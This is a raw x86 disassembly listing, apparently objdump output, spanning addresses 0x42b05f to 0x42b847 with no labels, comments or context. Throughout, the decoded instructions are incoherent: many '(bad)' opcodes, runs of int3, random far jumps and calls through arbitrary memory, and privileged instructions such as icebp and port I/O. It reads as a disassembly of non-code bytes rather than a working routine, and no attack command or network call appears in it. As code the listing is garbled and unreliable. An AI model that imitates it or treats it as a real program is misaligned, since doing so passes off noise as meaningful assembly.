  42b05f:	inc    DWORD PTR [esi+0x12]
  42b062:	add    BYTE PTR [ebp+0x32],dh
  42b065:	dec    DWORD PTR [ecx+0x6c7800]
  42b06b:	call   0x41b122
  42b070:	push   edi
  42b071:	mov    ebp,0xff7628cc
  42b076:	add    bh,bh
  42b078:	inc    edx
  42b079:	mov    ch,0x0
  42b07b:	popf   
  42b07c:	pop    esp
  42b07d:	int3   
  42b07e:	add    BYTE PTR [eax],al
  42b080:	adc    esi,eax
  42b082:	jmp    DWORD PTR [ecx+0x3d]
  42b085:	cmp    edi,0xffffff83
  42b088:	jno    0x42b082
  42b08a:	jmp    edx
  42b08c:	(bad)  
  42b08d:	dec    DWORD PTR [ecx-0x316201]
  42b093:	sbb    BYTE PTR [ecx],al
  42b095:	inc    DWORD PTR [ebx-0xc3a077]
  42b09b:	or     eax,0xff00ff01
  42b0a0:	das    
  42b0a1:	test   al,0x0
  42b0a3:	mov    ebp,DWORD PTR [ebx-0x1]
  42b0a6:	add    bh,bh
  42b0a8:	xor    al,0x80
  42b0aa:	add    BYTE PTR [edx],dl
  42b0ac:	jp     0x42b031
  42b0ae:	dec    esp
  42b0b0:	mov    al,0x8a
  42b0b2:	add    al,al
  42b0b4:	push   esp
  42b0b5:	(bad)  
  42b0b6:	(bad)  
  42b0b7:	jmp    FWORD PTR [edx-0x18]
  42b0ba:	add    ch,ch
  42b0bc:	clc    
  42b0bd:	inc    DWORD PTR [eax]
  42b0bf:	(bad)  
  42b0c0:	jl     0x42b05b
  42b0c2:	xor    DWORD PTR [eax+0x1c],0xffffffff
  42b0c6:	add    BYTE PTR [eax],al
  42b0c8:	loopne 0x42b05a
  42b0ca:	int3   
  42b0cb:	mov    ah,0xb8
  42b0cd:	dec    esp
  42b0cf:	inc    DWORD PTR [edx+esi*1-0x1]
  42b0d3:	jnp    0x42b133
  42b0d5:	(bad)  
  42b0d6:	inc    DWORD PTR [ebx-0x65ff1f34]
  42b0dc:	mov    bh,bh
  42b0de:	int3   
  42b0df:	inc    edx
  42b0e1:	xchg   esp,ecx
  42b0e3:	push   ds
  42b0e4:	sub    BYTE PTR [ebx+0x65118383],al
  42b0ea:	jmp    FWORD PTR [esi+0x6c]
  42b0ed:	(bad)  
  42b0ee:	(bad)  
  42b0ef:	jmp    FWORD PTR [ebp-0x2c]
  42b0f2:	jmp    ebp
  42b0f4:	mov    eax,ds:0x3eff83cc
  42b0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0fa:	int3   
  42b0fb:	cmp    edi,DWORD PTR [edi-0x1]
  42b0fe:	int3   
  42b0ff:	(bad)  
  42b100:	js     0x42b0c0
  42b102:	int3   
  42b103:	jmp    0xcd41b1b7
  42b108:	cdq    
  42b109:	xchg   edi,edi
  42b10b:	repnz push ebx
  42b10d:	(bad)  
  42b10e:	inc    DWORD PTR [ebx-0xff32a2]
  42b114:	enter  0xff00,0x0
  42b118:	(bad)  
  42b11a:	call   DWORD PTR [esi*4+0x72cc00ff]
  42b121:	push   ebp
  42b122:	jmp    FWORD PTR [ebp+0x75]
  42b125:	(bad)  
  42b126:	dec    DWORD PTR [ecx+0x3affbca7]
  42b12c:	dec    esp
  42b12d:	add    ah,cl
  42b12f:	xor    esi,0xfffffff7
  42b132:	push   DWORD PTR [ebx-0xff006f]
  42b138:	sub    al,BYTE PTR [edi+edi*8-0x7c8428]
  42b13f:	call   FWORD PTR [edx]
  42b141:	fcos   
  42b143:	mov    WORD PTR [edi+0x0],ss
  42b146:	(bad)  
  42b147:	dec    DWORD PTR [edi+ebp*8+0x1466ff]
  42b14e:	cmp    edi,0x36
  42b151:	clc    
  42b152:	add    BYTE PTR [eax-0x7c33ffe0],cl
  42b158:	inc    edx
  42b159:	clc    
  42b15a:	push   ecx
  42b15c:	inc    eax
  42b15d:	add    bh,bh
  42b15f:	mov    esi,ecx
  42b161:	add    bh,bh
  42b163:	mov    bl,BYTE PTR [ecx+0x56ffffcc]
  42b169:	icebp  
  42b16a:	add    BYTE PTR ds:0x83ff00,dl
  42b170:	lods   eax,DWORD PTR ds:[esi]
  42b171:	adc    eax,DWORD PTR [eax]
  42b173:	jbe    0x42b12b
  42b175:	(bad)  
  42b176:	inc    DWORD PTR [eax]
  42b178:	mov    eax,ds:0xd3e28338
  42b17d:	cmp    edi,0xffffffff
  42b180:	sti    
  42b181:	or     BYTE PTR [eax],al
  42b183:	ja     0x42b13d
  42b185:	add    BYTE PTR [eax],al
  42b187:	call   edi
  42b189:	push   ss
  42b18a:	and    DWORD PTR [ecx+0x76],0xffffff83
  42b18e:	add    bh,bh
  42b190:	pusha  
  42b191:	pop    es
  42b192:	xor    DWORD PTR [ecx-0x330066],0xffffffda
  42b199:	test   al,0x83
  42b19b:	push   ecx
  42b19c:	retf   
  42b19d:	dec    esp
  42b19f:	mov    DWORD PTR [ebp-0x582c0042],ecx
  42b1a5:	add    bh,bh
  42b1a7:	add    BYTE PTR [ebx],bl
  42b1a9:	outs   dx,DWORD PTR ds:[esi]
  42b1aa:	(bad)  
  42b1ab:	cld    
  42b1ac:	out    dx,eax
  42b1ad:	add    DWORD PTR [eax],0x0
  42b1b0:	dec    edi
  42b1b1:	sahf   
  42b1b2:	add    BYTE PTR ds:0xff0074,dl
  42b1b8:	push   ss
  42b1b9:	idiv   edi
  42b1bb:	into   
  42b1bc:	out    0xcc,eax
  42b1be:	dec    esp
  42b1c0:	nop
  42b1c1:	test   eax,0xff845500
  42b1c6:	(bad)  
  42b1c7:	push   DWORD PTR [ecx-0x1b]
  42b1ca:	jmp    FWORD PTR [edx-0x7cae]
  42b1d0:	or     BYTE PTR [esi+0xe156ff],0xff
  42b1d7:	jmp    DWORD PTR [edx-0x651ff52]
  42b1dd:	int3   
  42b1de:	(bad)  
  42b1df:	jmp    DWORD PTR [ebp-0x3b8b00e0]
  42b1e5:	int3   
  42b1e6:	dec    esp
  42b1e8:	imul   ebp,edi,0x89af28ff
  42b1ee:	or     esp,0x7
  42b1f1:	ud0    ebx,DWORD PTR [eax-0x7c7ca4]
  42b1f8:	popw   es
  42b1fa:	jmp    DWORD PTR ds:0xffffb0
  42b200:	mov    edi,0x85f00cc
  42b205:	int3   
  42b206:	(bad)  
  42b207:	jmp    FWORD PTR [ebp+edi*8+0xf720ff]
  42b20e:	(bad)  
  42b20f:	jmp    DWORD PTR ds:0x5deff85
  42b215:	inc    DWORD PTR [eax]
  42b217:	or     DWORD PTR [ebx],0x33
  42b21a:	inc    esp
  42b21c:	or     al,BYTE PTR [eax]
  42b21e:	add    bh,bh
  42b220:	inc    esi
  42b221:	cwde   
  42b222:	sbb    DWORD PTR [edi+0x34],0xffffffff
  42b226:	inc    DWORD PTR [ebx-0x4d006a7c]
  42b22c:	inc    DWORD PTR [ebx+0xcf48989]
  42b232:	int3   
  42b233:	dec    edx
  42b234:	clc    
  42b235:	dec    esp
  42b237:	int3   
  42b238:	or     eax,0x238bccf6
  42b23d:	(bad)  
  42b23e:	inc    DWORD PTR [eax]
  42b240:	bound  ecx,QWORD PTR [ebx-0x3342d734]
  42b246:	add    bh,bh
  42b248:	(bad)  
  42b249:	iret   
  42b24a:	add    BYTE PTR [ebx],al
  42b24c:	push   es
  42b24d:	inc    DWORD PTR [ebx+0x3acaff]
  42b253:	pop    edx
  42b254:	jmp    0xff97:0x54ffff83
  42b25b:	mov    ds:0xffcc00df,al
  42b260:	add    dl,BYTE PTR [edi+0x376d00]
  42b266:	add    BYTE PTR [eax],al
  42b268:	loope  0x42b220
  42b26a:	int3   
  42b26b:	sahf   
  42b26c:	add    DWORD PTR ds:[eax],0x0
  42b270:	mov    ds:0x5c51ff2b,eax
  42b275:	dec    DWORD PTR [ecx-0x72fe01]
  42b27b:	int    0x88
  42b27d:	int3   
  42b27e:	int3   
  42b27f:	add    BYTE PTR [ecx-0x1c],bl
  42b282:	int3   
  42b283:	pop    edi
  42b284:	adc    bh,bh
  42b286:	add    bh,bh
  42b288:	out    0x24,eax
  42b28a:	add    BYTE PTR [edi+0xff7e],bh
  42b290:	pop    eax
  42b291:	add    bh,bh
  42b293:	dec    ecx
  42b294:	imul   eax,DWORD PTR [eax],0xffffffff
  42b297:	jmp    FWORD PTR [ebp+0x7045ff84]
  42b29d:	dec    DWORD PTR [ecx-0x7c40f901]
  42b2a3:	mov    ch,0x71
  42b2a5:	int3   
  42b2a6:	add    DWORD PTR [eax],0xffffffbe
  42b2a9:	sub    DWORD PTR [ebx+0x83bd7b],eax
  42b2af:	xor    DWORD PTR [esi-0x3e],0xffffffcc
  42b2b3:	stos   DWORD PTR es:[edi],eax
  42b2b4:	mov    bl,0xff
  42b2b6:	dec    esp
  42b2b8:	popf   
  42b2b9:	sub    al,BYTE PTR [eax]
  42b2bb:	push   edi
  42b2bc:	inc    edi
  42b2bd:	add    bh,bh
  42b2bf:	push   DWORD PTR [ecx-0xa]
  42b2c2:	jmp    DWORD PTR [ebx-0x7cff7c71]
  42b2c8:	dec    esp
  42b2c9:	or     eax,0xff9588cc
  42b2ce:	(bad)  
  42b2cf:	(bad)  
  42b2d0:	jg     0x42b28e
  42b2d2:	add    BYTE PTR [eax+0x73],al
  42b2d5:	dec    esp
  42b2d7:	and    DWORD PTR [ecx],0xffffffe8
  42b2da:	add    esi,0x12
  42b2dd:	(bad)  
  42b2de:	(bad)  
  42b2df:	(bad)  
  42b2e0:	fnstenv [esi]
  42b2e2:	mov    ecx,edx
  42b2e4:	pop    ecx
  42b2e5:	inc    DWORD PTR [eax]
  42b2e7:	and    DWORD PTR [edx+0x3e],0x0
  42b2eb:	mov    al,0x21
  42b2ed:	add    bh,bh
  42b2ef:	(bad)  
  42b2f0:	call   0xffd2b20c
  42b2f5:	(bad)  
  42b2f6:	(bad)  
  42b2f7:	push   DWORD PTR [esi-0x6b]
  42b2fa:	dec    DWORD PTR [ebx-0x20]
  42b2fd:	(bad)  
  42b2fe:	(bad)  
  42b2ff:	inc    esi
  42b301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b302:	sub    DWORD PTR [ebp-0x33ffff34],0x44
  42b309:	dec    esi
  42b30a:	add    BYTE PTR [ebp+0x49],bl
  42b30d:	add    BYTE PTR [eax],al
  42b30f:	jmp    DWORD PTR [eax-0x7a]
  42b312:	dec    esp
  42b314:	add    edi,edi
  42b316:	add    bh,bh
  42b318:	cwde   
  42b319:	enter  0x1aff,0xab
  42b31d:	add    DWORD PTR [eax],0x0
  42b320:	scas   eax,DWORD PTR es:[edi]
  42b321:	fdivr  st,st(7)
  42b323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b324:	popf   
  42b325:	dec    DWORD PTR [ecx+0x33d583]
  42b32b:	(bad)  
  42b32c:	retf   0xff83
  42b32f:	int3   
  42b330:	jg     0x42b350
  42b332:	(bad)  
  42b333:	(bad)  [eax-0x1]
  42b336:	add    BYTE PTR [eax],al
  42b338:	pop    ecx
  42b339:	mov    ch,0x0
  42b33b:	out    dx,eax
  42b33c:	mov    eax,0x27ff8300
  42b341:	xor    DWORD PTR [eax],eax
  42b343:	push   ebx
  42b344:	sbb    BYTE PTR [eax],al
  42b346:	dec    esp
  42b348:	jae    0x42b2ff
  42b34a:	jmp    DWORD PTR ds:0xffff0085
  42b350:	ret    0xff34
  42b353:	xchg   DWORD PTR [ebp+0x7189ff00],edi
  42b359:	jp     0x42b35b
  42b35b:	rol    DWORD PTR [edi+edi*8],cl
  42b35e:	cmp    edi,0x41
  42b361:	dec    edx
  42b362:	push   DWORD PTR [eax]
  42b364:	cmp    al,0x0
  42b366:	(bad)  
  42b367:	jmp    FWORD PTR [edx+0x8]
  42b36a:	add    bl,ch
  42b36c:	out    0x0,al
  42b36e:	dec    DWORD PTR [ecx+0x63000260]
  42b374:	mov    al,ds:0x1283cc83
  42b379:	jg     0x42b2fe
  42b37b:	stc    
  42b37c:	dec    ebp
  42b37d:	(bad)  
  42b37e:	(bad)  
  42b37f:	push   DWORD PTR [ebx-0x45ff5c]
  42b385:	add    BYTE PTR [ebx-0x7cff8077],al
  42b38b:	and    eax,0x83ffffaa
  42b390:	fs mov ebp,0xcc33d8cc
  42b396:	add    DWORD PTR [eax],0x26
  42b399:	test   BYTE PTR [ebx-0x7c00f2b2],0xff
  42b3a0:	(bad)  
  42b3a1:	loopne 0x42b3a3
  42b3a3:	xlat   BYTE PTR ds:[ebx]
  42b3a4:	pop    ebx
  42b3a5:	int3   
  42b3a6:	dec    DWORD PTR [ecx-0x3c7cd624]
  42b3ac:	outs   dx,DWORD PTR ds:[esi]
  42b3ad:	add    BYTE PTR [eax],al
  42b3af:	dec    DWORD PTR ds:0xb8f0025
  42b3b5:	(bad)  
  42b3b6:	inc    DWORD PTR [ebx+0x1dfff1ab]
  42b3bc:	adc    edi,edi
  42b3be:	cmp    edi,0x53
  42b3c1:	add    DWORD PTR [eax],0x43
  42b3c4:	aas    
  42b3c5:	or     esp,0xffffffff
  42b3c8:	leave  
  42b3c9:	mov    BYTE PTR [ebx+0xffaff7],al
  42b3cf:	jmp    DWORD PTR [ebp+0x5b]
  42b3d2:	mov    DWORD PTR [edx-0x7cff0094],ecx
  42b3d8:	xchg   esp,eax
  42b3d9:	mov    ecx,0x89df84ff
  42b3de:	int3   
  42b3df:	(bad)  
  42b3e0:	dec    dh
  42b3e2:	add    BYTE PTR [edx+ebx*2],al
  42b3e5:	add    DWORD PTR [eax],0xffffffff
  42b3e8:	add    BYTE PTR [eax-0x7d],dl
  42b3eb:	sbb    al,0xe9
  42b3ed:	(bad)  
  42b3ee:	inc    DWORD PTR [eax]
  42b3f0:	out    dx,al
  42b3f1:	mov    esi,0xff813bff
  42b3f6:	add    bh,bh
  42b3f8:	idiv   BYTE PTR [ebx]
  42b3fa:	add    BYTE PTR [ebp-0x76ff006e],ah
  42b400:	mov    esp,0x3359ffb7
  42b405:	add    bh,bh
  42b407:	add    BYTE PTR [esi],al
  42b409:	fild   WORD PTR [ebx-0x7c83b6]
  42b40f:	add    BYTE PTR [esi],bl
  42b411:	push   0x89324b00
  42b416:	inc    DWORD PTR [eax]
  42b418:	into   
  42b419:	lea    eax,[ebx-0x7c0048b0]
  42b41f:	add    DWORD PTR [ecx],0x6f
  42b422:	sub    DWORD PTR [ebp-0xff0069],0xffffff9c
  42b429:	push   eax
  42b42a:	dec    DWORD PTR [edi]
  42b42c:	arpl   WORD PTR [ecx+0x1e628900],cx
  42b432:	add    BYTE PTR [edi],bl
  42b434:	dec    esp
  42b435:	add    BYTE PTR [eax],al
  42b437:	dec    DWORD PTR [edi+0x4]
  42b43a:	or     DWORD PTR [eax-0xd],0xffffff83
  42b43e:	(bad)  
  42b43f:	call   FWORD PTR [eax]
  42b441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b442:	call   FWORD PTR [ebp+0x54]
  42b445:	cmp    edi,0x0
  42b448:	pop    ds
  42b449:	add    bh,bh
  42b44b:	iret   
  42b44c:	or     eax,DWORD PTR [ebx+0x35c18300]
  42b452:	call   DWORD PTR [edi+0xfff5]
  42b458:	sub    eax,0x622c83e7
  42b45d:	int3   
  42b45e:	add    ah,cl
  42b460:	and    eax,0xb85dffbc
  42b465:	add    bh,bh
  42b467:	cmp    DWORD PTR [edx],0x27
  42b46a:	sub    DWORD PTR [esi+edx*2-0x527c0034],0x53
  42b472:	cmp    DWORD PTR [esi+0x8964],0x63
  42b479:	adc    eax,0xcc76c2cc
  42b47e:	add    bh,bh
  42b480:	(bad)  
  42b481:	into   
  42b482:	call   DWORD PTR [edx]
  42b484:	mov    dh,0x89
  42b486:	mov    edi,edi
  42b488:	int3   
  42b489:	int3   
  42b48a:	int3   
  42b48b:	int3   
  42b48c:	int3   
  42b48d:	int3   
  42b48e:	int3   
  42b48f:	int3   
  42b490:	in     eax,dx
  42b491:	pop    DWORD PTR [eax]
  42b493:	push   0xffffffff
  42b495:	add    ah,cl
  42b497:	jge    0x42b4ee
  42b499:	into   
  42b49a:	int3   
  42b49b:	cmp    bh,0xff
  42b49e:	add    BYTE PTR [edi+0x6a],al
  42b4a1:	test   esp,0xff00ff54
  42b4a7:	rol    DWORD PTR [eax-0x339400be],cl
  42b4ad:	add    DWORD PTR [ebx+0x3f8672],0x4
  42b4b4:	inc    DWORD PTR [ebx-0x2726cf7d]
  42b4ba:	push   DWORD PTR [edi]
  42b4bc:	add    BYTE PTR [eax],al
  42b4be:	call   FWORD PTR [eax-0x1976bf39]
  42b4c4:	inc    DWORD PTR [eax]
  42b4c6:	add    BYTE PTR [ebx+0x800d9ff],ch
  42b4cc:	(bad)  
  42b4cd:	(bad)  
  42b4ce:	inc    DWORD PTR [ebp-0x57]
  42b4d1:	mov    al,BYTE PTR [ebx+0x89ffa9]
  42b4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4d8:	and    eax,0x1483e8
  42b4dd:	(bad)  
  42b4de:	call   FWORD PTR [edi+esi*2+0x14]
  42b4e2:	mov    DWORD PTR [eax+eax*1+0x0],edx
  42b4e6:	or     edi,0x6
  42b4e9:	jg     0x42b4eb
  42b4eb:	out    0xff,al
  42b4ed:	cmp    edi,0x19
  42b4f0:	out    dx,al
  42b4f1:	mov    edi,0xff839900
  42b4f6:	call   DWORD PTR [eax+0x57]
  42b4f9:	cdq    
  42b4fa:	add    dl,cl
  42b4fc:	int3   
  42b4fd:	(bad)  
  42b4fe:	(bad)  
  42b4ff:	clc    
  42b500:	mov    eax,ds:0xbd89c8
  42b505:	inc    DWORD PTR [ebx+0x2bf9db]
  42b50b:	nop
  42b50c:	cmp    edi,0xffffffff
  42b50f:	pop    esi
  42b510:	or     al,0x82
  42b512:	sub    DWORD PTR [ebx],0x0
  42b515:	dec    DWORD PTR [ecx-0x7c623f81]
  42b51b:	out    0x0,eax
  42b51d:	(bad)  
  42b51e:	jmp    FWORD PTR [ebx]
  42b520:	or     DWORD PTR [esi+0x0],ecx
  42b523:	push   ebx
  42b524:	(bad)  
  42b525:	(bad)  
  42b526:	push   DWORD PTR [edx+0x1e]
  42b529:	add    bh,bh
  42b52b:	bound  eax,QWORD PTR [ebx+0x56c4ff83]
  42b531:	icebp  
  42b532:	add    DWORD PTR [edx+0x0],0xffffffcc
  42b536:	dec    DWORD PTR [edi+0x2]
  42b539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b53a:	(bad)  
  42b53b:	out    dx,eax
  42b53c:	inc    DWORD PTR [eax]
  42b53e:	dec    DWORD PTR [esp+edi*8-0x43ff01]
  42b545:	add    bh,bh
  42b547:	inc    esp
  42b548:	in     eax,0xde
  42b54a:	cmp    edi,0x0
  42b54d:	add    BYTE PTR [ecx+0xf8758a],cl
  42b553:	(bad)  
  42b556:	add    ch,bl
  42b558:	add    eax,0x77ff86
  42b55d:	add    bh,bh
  42b55f:	mov    esp,0x6200b45a
  42b564:	add    BYTE PTR [eax],al
  42b566:	add    BYTE PTR [ecx+0x46],dl
  42b569:	retf   
  42b56a:	add    edx,0xffffff83
  42b56d:	add    ah,cl
  42b56f:	pop    esp
  42b570:	retf   
  42b571:	adc    DWORD PTR [eax],eax
  42b573:	cmp    al,0xff
  42b575:	int3   
  42b576:	add    BYTE PTR [edi],dl
  42b578:	dec    edi
  42b579:	add    DWORD PTR [eax],0x83ffff96
  42b57f:	loop   0x42b541
  42b581:	test   eax,0xffff0800
  42b586:	add    bl,dh
  42b588:	sbb    cl,dl
  42b58a:	int3   
  42b58b:	cmp    al,0x0
  42b58d:	(bad)  
  42b58e:	inc    DWORD PTR [ecx-0x5d]
  42b591:	xor    DWORD PTR [eax],eax
  42b593:	lea    eax,[eax]
  42b595:	add    bh,bh
  42b597:	aad    0xf4
  42b599:	dec    edi
  42b59a:	add    dl,dh
  42b59c:	inc    DWORD PTR [eax]
  42b59e:	inc    ebp
  42b5a0:	add    eax,0x8329ccd8
  42b5a5:	add    bh,bh
  42b5a7:	imul   BYTE PTR [ebp-0x470023]
  42b5ad:	inc    DWORD PTR [ebx-0x7c4ad8f1]
  42b5b3:	cmp    bh,bh
  42b5b5:	cmp    edi,0x5d
  42b5b8:	int3   
  42b5b9:	cmp    edi,edi
  42b5bb:	mov    ecx,0x5dccffff
  42b5c0:	adc    eax,DWORD PTR [esi-0x7d]
  42b5c3:	mov    dl,0x83
  42b5c5:	(bad)  
  42b5c6:	jmp    FWORD PTR [edx-0x7300b707]
  42b5cc:	add    BYTE PTR [ebx+0x35b1e1ff],al
  42b5d2:	(bad)  
  42b5d3:	mov    edi,0x6d8383ff
  42b5d8:	and    bh,BYTE PTR [ebx]
  42b5da:	push   DWORD PTR [ebx-0x1]
  42b5dd:	add    bh,bh
  42b5df:	jnp    0x42b5fd
  42b5e1:	push   esp
  42b5e2:	inc    edi
  42b5e4:	(bad)  
  42b5e5:	inc    DWORD PTR [eax]
  42b5e7:	fst    QWORD PTR [ecx-0x333600ae]
  42b5ed:	add    BYTE PTR [ebx-0x6b915c],al
  42b5f3:	sbb    al,0xff
  42b5f5:	cmp    edi,0xffffffc9
  42b5f8:	es js  0x42b5c7
  42b5fb:	imul   eax,DWORD PTR [eax],0x0
  42b5fe:	add    BYTE PTR [edx],al
  42b600:	ror    DWORD PTR [esi-0x34],0xb8
  42b604:	(bad)  
  42b605:	inc    DWORD PTR [ebx-0x7cb03877]
  42b60b:	pop    ds
  42b60c:	add    bh,bh
  42b60e:	push   DWORD PTR [edx-0x630080c0]
  42b614:	inc    DWORD PTR [eax]
  42b616:	call   ebx
  42b618:	fwait
  42b619:	jb     0x42b61b
  42b61b:	dec    ecx
  42b61c:	dec    esp
  42b61e:	inc    DWORD PTR [ecx]
  42b620:	imul   eax,DWORD PTR [edx],0x0
  42b623:	iret   
  42b624:	inc    DWORD PTR [eax]
  42b626:	jmp    DWORD PTR [edx-0x45]
  42b629:	or     bh,bh
  42b62b:	pop    ds
  42b62c:	mov    edi,edi
  42b62e:	add    BYTE PTR [ebx+0xfff431f],al
  42b634:	add    bh,bh
  42b636:	jmp    DWORD PTR [ecx+0x76]
  42b639:	push   ecx
  42b63a:	(bad)  
  42b63b:	mov    eax,0xbcffff89
  42b640:	lea    esp,[esi-0x7c5400]
  42b646:	int3   
  42b647:	push   ss
  42b648:	lea    eax,ds:0xd900
  42b64e:	dec    esp
  42b650:	sub    edx,DWORD PTR [edi]
  42b652:	mov    DWORD PTR [eax+0x5a830089],esp
  42b658:	pop    edx
  42b659:	int3   
  42b65a:	call   DWORD PTR [edi+0x72ccffff]
  42b660:	fwait
  42b661:	and    edi,edi
  42b663:	fadd   DWORD PTR [eax]
  42b665:	add    bh,bh
  42b667:	sbb    BYTE PTR [esi],dl
  42b669:	push   ss
  42b66a:	(bad)  
  42b66b:	fadd   DWORD PTR [ebx+0x47e80083]
  42b671:	(bad)  
  42b672:	add    BYTE PTR [ecx],dh
  42b674:	dec    DWORD PTR [ecx+0xebc4eff]
  42b67a:	and    DWORD PTR [ebx-0x7d],0xffffffff
  42b67e:	add    BYTE PTR [esi+eax*8],bh
  42b681:	leave  
  42b682:	dec    DWORD PTR [esi]
  42b684:	mov    edi,edi
  42b686:	add    BYTE PTR [edx-0x3500efa7],dh
  42b68c:	(bad)  
  42b68d:	(bad)  
  42b68e:	dec    DWORD PTR [ecx+0x3a]
  42b691:	jl     0x42b616
  42b693:	jne    0x42b695
  42b695:	add    DWORD PTR [eax],0xffffffad
  42b698:	lock dec DWORD PTR gs:[edi-0x77]
  42b69d:	inc    DWORD PTR [eax]
  42b69f:	aam    0x9a
  42b6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6a2:	int3   
  42b6a3:	jmp    0x42b6a5
  42b6a5:	add    BYTE PTR [ecx-0x3f8e6e],cl
  42b6ab:	popa   
  42b6ac:	dec    DWORD PTR [ecx+0x326d79ff]
  42b6b2:	add    BYTE PTR [edi+0x66ffffff],al
  42b6b8:	sbb    esi,ebx
  42b6ba:	dec    DWORD PTR [ecx+0x6e0000ff]
  42b6c0:	scas   eax,DWORD PTR es:[edi]
  42b6c1:	pop    ss
  42b6c2:	add    al,bh
  42b6c4:	cmp    edi,0xffffffff
  42b6c7:	dec    ebx
  42b6c9:	gs jmp esi
  42b6cc:	add    bh,bh
  42b6ce:	inc    DWORD PTR [ecx]
  42b6d0:	xchg   ecx,eax
  42b6d1:	or     BYTE PTR [eax],al
  42b6d3:	sbb    eax,0xbcff8900
  42b6d8:	mov    eax,ds:0xff71cc6e
  42b6dd:	inc    DWORD PTR [eax]
  42b6df:	and    al,0x46
  42b6e1:	(bad)  
  42b6e2:	inc    DWORD PTR [esi-0x7d]
  42b6e5:	int3   
  42b6e6:	jmp    FWORD PTR [esi]
  42b6e8:	adc    ebp,DWORD PTR [edx-0x1]
  42b6eb:	sbb    bh,bh
  42b6ed:	add    BYTE PTR [eax],al
  42b6ef:	dec    eax
  42b6f0:	sbb    cl,BYTE PTR [esi]
  42b6f2:	(bad)  
  42b6f3:	stc    
  42b6f4:	inc    DWORD PTR [ebx-0xa778e01]
  42b6fa:	xor    DWORD PTR ds:0x92cc00ff,0xffffffe1
  42b701:	cmc    
  42b702:	jmp    FWORD PTR [eax]
  42b704:	mov    DWORD PTR [ecx-0x210a9801],ecx
  42b70a:	add    dl,ah
  42b70c:	add    DWORD PTR [eax],0xffffff83
  42b70f:	push   eax
  42b710:	fld    TBYTE PTR [ebx]
  42b712:	jmp    DWORD PTR [edi+edi*8]
  42b715:	add    DWORD PTR [eax],0xffffffa5
  42b718:	push   ecx
  42b719:	mov    esi,0x89ff7e89
  42b71e:	int3   
  42b71f:	mov    ecx,0xc1fff4b6
  42b724:	(bad)  
  42b725:	(bad)  
  42b726:	call   DWORD PTR [edx-0x54]
  42b729:	xchg   ebp,eax
  42b72a:	sbb    DWORD PTR [esi],0xffffffcc
  42b72d:	inc    DWORD PTR [eax]
  42b72f:	out    dx,al
  42b730:	(bad)  
  42b731:	pushf  
  42b732:	int3   
  42b733:	and    eax,0x80000ff
  42b738:	jmp    0x42b782
  42b73a:	or     DWORD PTR [ecx+0x4a00ff83],0xffffff97
  42b741:	in     eax,dx
  42b742:	sbb    DWORD PTR [edi-0x1],0x0
  42b746:	sbb    DWORD PTR [ecx-0x49ff0930],0xffffffff
  42b74d:	(bad)  
  42b74e:	jmp    FWORD PTR [edx+esi*8+0x6effd2]
  42b755:	inc    DWORD PTR [ebx+0xb26b7d]
  42b75b:	sbb    eax,DWORD PTR [eax]
  42b75d:	(bad)  
  42b75e:	dec    DWORD PTR [ecx+0x5f830862]
  42b764:	inc    DWORD PTR [ebx-0x15d08c01]
  42b76a:	add    BYTE PTR [edi-0x4d000100],ch
  42b770:	addr16 and bh,bh
  42b773:	(bad)  
  42b774:	add    BYTE PTR [eax],al
  42b776:	mov    DWORD PTR [edi],ebp
  42b778:	aam    0x75
  42b77a:	add    BYTE PTR [edx-0x37000001],ch
  42b780:	pop    ebp
  42b781:	(bad)  
  42b782:	(bad)  
  42b783:	std    
  42b784:	add    bh,bh
  42b786:	call   DWORD PTR [eax+0x2b00ca6a]
  42b78c:	int3   
  42b78d:	(bad)  
  42b78e:	dec    DWORD PTR [ebp+0xeffd639]
  42b794:	(bad)  
  42b795:	(bad)  
  42b796:	dec    ebx
  42b798:	adc    eax,0x11ffbc
  42b79d:	add    bh,bh
  42b79f:	xor    ah,BYTE PTR [ecx-0x76f8001c]
  42b7a5:	inc    DWORD PTR [eax]
  42b7a7:	pop    ecx
  42b7a8:	bound  eax,QWORD PTR ds:[eax]
  42b7ab:	pop    es
  42b7ac:	inc    DWORD PTR [eax]
  42b7ae:	add    BYTE PTR [esp+edi*1],bh
  42b7b1:	jae    0x42b736
  42b7b3:	add    DWORD PTR [ebx+0x36f2cc00],eax
  42b7b9:	mov    ds:0xffffabcc,al
  42b7be:	int3   
  42b7bf:	dec    edi
  42b7c0:	xchg   esi,eax
  42b7c1:	scas   al,BYTE PTR es:[edi]
  42b7c2:	jmp    DWORD PTR [eax-0xc76ff01]
  42b7c8:	or     ch,BYTE PTR [ebx-0x5d77]
  42b7ce:	mov    DWORD PTR [ebp+0x2f00a63a],ebp
  42b7d4:	add    bh,bh
  42b7d6:	dec    DWORD PTR [ebx-0x6d]
  42b7d9:	ins    BYTE PTR es:[edi],dx
  42b7da:	add    DWORD PTR [eax+0x47830089],0x1c
  42b7e1:	push   ds
  42b7e2:	push   DWORD PTR [edx]
  42b7e4:	add    bh,bh
  42b7e6:	mov    DWORD PTR [ebp-0x2a00f64e],edi
  42b7ec:	inc    DWORD PTR [ebx+0x6cf288ff]
  42b7f2:	call   FWORD PTR [esi]
  42b7f4:	add    BYTE PTR [eax],al
  42b7f6:	jmp    DWORD PTR [edx+0x43892bfe]
  42b7fc:	add    bh,bh
  42b7fe:	add    BYTE PTR [edi+0x350045a4],dh
  42b804:	add    DWORD PTR [ebx+0x7c56e683],0x0
  42b80b:	(bad)  
  42b80c:	add    bh,bh
  42b80e:	jmp    DWORD PTR [eax]
  42b810:	pop    ecx
  42b811:	push   eax
  42b812:	sub    ebx,0xffffffff
  42b815:	add    bh,bh
  42b817:	ror    dl,0x47
  42b81a:	add    BYTE PTR ds:0xcb0000ff,dh
  42b820:	dec    ebx
  42b821:	dec    eax
  42b822:	add    BYTE PTR [ebx-0x6f000000],al
  42b828:	aad    0xd4
  42b82a:	xor    DWORD PTR [eax-0x34],0xffffff83
  42b82e:	int3   
  42b82f:	xor    bh,ah
  42b831:	push   0xffff20ff
  42b836:	dec    DWORD PTR [esp+ebx*8-0x75]
  42b83a:	call   FWORD PTR [eax-0xaff7c01]
  42b840:	scas   al,BYTE PTR es:[edi]
  42b841:	xor    DWORD PTR [ecx-0x7cffa6],ecx
  42b847:	mul    dl
